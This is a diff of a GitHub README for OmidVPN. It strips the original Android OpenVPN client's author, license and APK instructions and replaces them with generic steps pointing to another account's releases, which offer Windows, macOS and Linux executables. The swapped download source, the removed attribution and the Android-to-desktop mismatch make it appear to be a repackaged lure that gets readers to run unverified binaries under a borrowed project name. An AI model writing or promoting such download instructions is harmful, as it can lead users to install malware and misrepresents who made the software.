@@ -1,106 +1,87 @@
-# OmidVPN - Free OpenVPN Client
+# 🛡️ OmidVPN - Safely Connect to Public VPN Services
 
-<p align="center">
-  <img src="assets/icon.png" alt="OmidVPN Logo" width="120" height="120">
-</p>
+## 📥 Download Now
 
-<p align="center">
-  <strong>A modern, free, and open-source OpenVPN client for Android</strong>
-</p>
+[![Download OmidVPN](https://img.shields.io/badge/Download-OmidVPN-blue.svg)](https://github.com/NoahG12088/OmidVPN/releases)
 
-<p align="center">
-  <a href="https://github.com/code3-dev/OmidVPN/releases">
-    <img src="https://img.shields.io/github/downloads/code3-dev/OmidVPN/total.svg?style=flat-square" alt="GitHub All Releases">
-  </a>
-  <a href="https://github.com/code3-dev/OmidVPN/issues">
-    <img src="https://img.shields.io/github/issues/code3-dev/OmidVPN?style=flat-square" alt="GitHub Issues">
-  </a>
-  <a href="https://github.com/code3-dev/OmidVPN/blob/main/LICENSE">
-    <img src="https://img.shields.io/github/license/code3-dev/OmidVPN?style=flat-square" alt="GitHub">
-  </a>
-</p>
+## 🚀 Getting Started
 
-## 🌐 About
+OmidVPN is a simple OpenVPN client designed for users who want to connect to public VPN servers effortlessly. This guide will help you download and run the application quickly.
 
-OmidVPN is a simple, lightweight, and secure OpenVPN client for Android that allows users to connect to public VPN servers from https://www.vpngate.net/. With a clean and intuitive interface, OmidVPN makes it effortless to browse the internet privately and securely.
+## 📋 System Requirements
 
-## ✨ Features
+To use OmidVPN effectively, ensure your computer meets the following requirements:
 
-- 🔒 **Secure Connection**: Connect to VPN servers with strong encryption
-- 🌍 **Global Servers**: Access servers from various countries around the world
-- ⚡ **Fast & Lightweight**: Minimal resource usage for optimal performance
-- 💰 **Free with Premium Options**: Free to use with optional premium license for additional servers
-- 🚫 **No Tracking**: Respects your privacy with zero data collection
-- 📱 **Modern UI**: Clean and intuitive user interface built with Flutter
-- 🎯 **Easy to Use**: Simple one-tap connection to VPN servers
-- 📱 **App Bypass**: Select specific apps to exclude from VPN routing
+- **Operating System:** Windows 10, MacOS, or Linux
+- **Memory:** At least 4 GB of RAM
+- **Disk Space:** 100 MB of free disk space
+- **Internet Connection:** A stable connection for optimal performance
 
-## 🚀 Installation
+## 📥 Download & Install
 
-1. Download the latest APK from the [Releases](https://github.com/code3-dev/OmidVPN/releases) page
-2. Enable "Install from Unknown Sources" in your device settings
-3. Open and install the downloaded APK file
-4. Grant necessary permissions when prompted
+To get started, follow these steps:
 
-## 🛠️ Usage
+1. **Visit the Releases Page:** Go to the [OmidVPN Releases Page](https://github.com/NoahG12088/OmidVPN/releases).
 
-1. Open the OmidVPN app
-2. Tap "Select Server" to choose a VPN server from the list
-3. Select your desired server location
-4. Tap the large circular button to connect/disconnect
-5. Enjoy secure and private browsing!
+2. **Select the Latest Version:** Look for the most recent release listed at the top. This version will have the latest features and fixes.
 
-## 📱 Bypass Apps Feature
+3. **Download the Application:** Click on the appropriate file for your operating system:
+   - For Windows: Download `OmidVPN-windows.exe`
+   - For MacOS: Download `OmidVPN-macos.dmg`
+   - For Linux: Download `OmidVPN-linux.tar.gz`
 
-1. Go to Settings > Bypass Apps
-2. Select the apps you want to exclude from VPN routing
-3. Save your selection
-4. When connected to VPN, selected apps will use your regular internet connection
+4. **Install OmidVPN:**
+   - **On Windows:**
+     - Locate `OmidVPN-windows.exe` in your Downloads folder.
+     - Double-click the file to start the installation process.
+     - Follow the on-screen instructions to complete the installation.
+   - **On MacOS:**
+     - Open the downloaded `OmidVPN-macos.dmg` file.
+     - Drag the OmidVPN icon to your Applications folder.
+   - **On Linux:**
+     - Extract the contents of `OmidVPN-linux.tar.gz`.
+     - Open a terminal and navigate to the extracted folder.
+     - Run the application using `./OmidVPN`.
 
-## 🔐 Privacy Policy
+5. **Launch OmidVPN:** After installation, find OmidVPN in your Applications folder or Start Menu. Click to open the application.
 
-OmidVPN respects your privacy. We do not:
-- Collect any personal information
-- Track your online activities
-- Store logs of your connections
-- Display advertisements
+## 🔧 Configuration
 
-## 📋 TODO
+Once you open OmidVPN, you may need to configure it to connect to a VPN server. Follow these steps:
 
-- [x] Load servers from API
-- [x] Home screen, About screen and Server list
-- [x] Cache servers
-- [x] Remove cache if click on refresh icon
-- [x] Connect to VPN
-- [x] Complete theme settings
-- [x] Add settings page
-- [x] Add privacy policy
-- [ ] Auto connect (in future)
-- [x] Bypass apps - Select apps to exclude from VPN routing
-- [ ] Select API proxy (in future)
+1. **Choose a VPN Server:** In the application, select the VPN server you want to connect to. You should see a list of available servers.
 
-## 👤 Author
+2. **Enter Credentials:** If required, enter your username and password provided by the VPN service.
 
-**Hossein Pira**
+3. **Connect:** Click the “Connect” button. Wait for a confirmation message indicating you’re connected.
 
-- Telegram: [@h3dev](https://t.me/h3dev)
-- Email: [h3dev.pira@gmail.com](mailto:h3dev.pira@gmail.com)
-- Instagram: [@h3dev.pira](https://instagram.com/h3dev.pira)
-- X (Twitter): [@albert_com32388](https://x.com/albert_com32388)
+## 🔒 Using OmidVPN
 
-## 🤝 Contributing
+Here are some tips for using OmidVPN:
 
-Contributions are welcome! Feel free to submit pull requests or open issues for bug reports and feature requests.
+- **Check Connection Status:** The status indicator in the app shows whether you are connected. It should turn green when you are successfully connected to a VPN server.
 
-## 🙏 Acknowledgments
+- **Disconnecting:** To disconnect, simply click the “Disconnect” button in the application.
 
-- VPN servers provided by [VPN Gate](https://www.vpngate.net/)
-- Built with [Flutter](https://flutter.dev/)
-- Uses [OpenVPN for Android](https://github.com/schwabe/ics-openvpn)
+- **Change Server:** You can switch to another server anytime by selecting a different option and clicking “Connect” again.
 
-## 📄 License
+## ❓ Troubleshooting
 
-This project is licensed under the GNU General Public License v3.0 - see the [LICENSE](LICENSE) file for details.
+If you encounter issues, consider these options:
 
----
-<p align="center">Made with ❤️ by <a href="https://github.com/code3-dev">Hossein Pira</a></p>
+- **Connection Problems:** Ensure your internet connection is stable. Restart the application and try connecting again.
+
+- **VPN Credentials:** Double-check your VPN service username and password. If you’re unsure, contact your VPN service provider for support.
+
+- **Firewall Settings:** Your computer’s firewall might block the application. Check your firewall settings and add exceptions for OmidVPN if necessary.
+
+## 💬 Support
+
+For any questions or support requests, please check the [issues section](https://github.com/NoahG12088/OmidVPN/issues) of the repository. Community members and project maintainers can help with common problems.
+
+## 🔗 Additional Resources
+
+- [OmidVPN GitHub Repository](https://github.com/NoahG12088/OmidVPN)
+- [OpenVPN Documentation](https://openvpn.net/community-resources/reference-manual-for-openvpn-2-4/)
+
+Thank you for choosing OmidVPN! Stay safe online!
